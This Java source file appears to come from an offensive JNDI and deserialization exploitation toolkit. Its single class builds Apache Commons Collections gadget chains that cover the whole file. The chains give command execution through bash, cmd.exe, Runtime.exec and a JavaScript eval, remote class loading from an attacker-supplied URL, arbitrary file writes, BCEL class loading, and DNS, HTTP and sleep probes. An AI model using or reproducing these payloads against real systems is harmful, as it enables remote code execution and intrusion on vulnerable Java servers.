package com.qi4l.jndi.gadgets.utils.cc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.script.ScriptEngineManager;
import java.io.FileOutputStream;
import java.net.URL;
import java.net.URLClassLoader;

import static com.qi4l.jndi.gadgets.utils.Utils.base64Decode;
import static com.qi4l.jndi.gadgets.utils.Utils.handlerCommand;

public class TransformerUtil {

    public static Transformer[] makeTransformer(String command) throws Exception {
        Transformer[] transformers;
        String[]      execArgs = {command};

        if (command.startsWith("TS-")) {
            transformers = new Transformer[]{new ConstantTransformer(Thread.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"currentThread", null}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{Long.parseLong(command.split("[-]")[1] + "000")}),};
        } else if (command.startsWith("RC-")) {
            String[] strings = handlerCommand(command);
            transformers = new Transformer[]{new ConstantTransformer(URLClassLoader.class), new InstantiateTransformer(new Class[]{URL[].class}, new Object[]{new URL[]{new URL(strings[0])}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{strings[1]}), new InstantiateTransformer(null, null)};
        } else if (command.startsWith("WF-")) {
            String[] strings = handlerCommand(command);
            transformers = new Transformer[]{new ConstantTransformer(FileOutputStream.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{strings[0]}}), new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{base64Decode(strings[1]).getBytes()}), new ConstantTransformer(Integer.valueOf(1))};
        } else if (command.startsWith("PB-lin")) {
            transformers = new Transformer[]{new ConstantTransformer(ProcessBuilder.class), new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"bash", "-c", base64Decode(command.split("[-]")[2])}}}), new InvokerTransformer("start", new Class[]{}, new Object[]{})};
        } else if (command.startsWith("PB-win")) {
            transformers = new Transformer[]{new ConstantTransformer(ProcessBuilder.class), new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String[].class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", base64Decode(command.split("[-]")[2])}}}), new InvokerTransformer("start", new Class[]{}, new Object[]{})};
        } else if (command.startsWith("SE-")) {
            transformers = new Transformer[]{new ConstantTransformer(ScriptEngineManager.class), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}), new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{"java.lang.Runtime.getRuntime().exec('" + base64Decode(command.split("[-]")[1]) + "');"})};
        } else if (command.startsWith("DL-")) {
            transformers = new Transformer[]{new ConstantTransformer(java.net.InetAddress.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getAllByName", new Class[]{String.class}}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{command.split("[-]")[1]}}), new ConstantTransformer(1)};
        } else if (command.startsWith("HL-")) {
            transformers = new Transformer[]{new ConstantTransformer(java.net.URL.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{command.split("[-]")[1]}}), new InvokerTransformer("getContent", new Class[0], new Object[0]), new ConstantTransformer(1)};
        } else if (command.startsWith("BC-")) {
            transformers = new Transformer[]{new ConstantTransformer(com.sun.org.apache.bcel.internal.util.ClassLoader.class), new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}), new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}), new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{command.split("[-]")[1]}), new InvokerTransformer("newInstance", new Class[0], new Object[0]), new ConstantTransformer(1)};
        } else {
            transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, (Object[]) execArgs), new ConstantTransformer(Integer.valueOf(1))};
        }
        return transformers;
    }

}
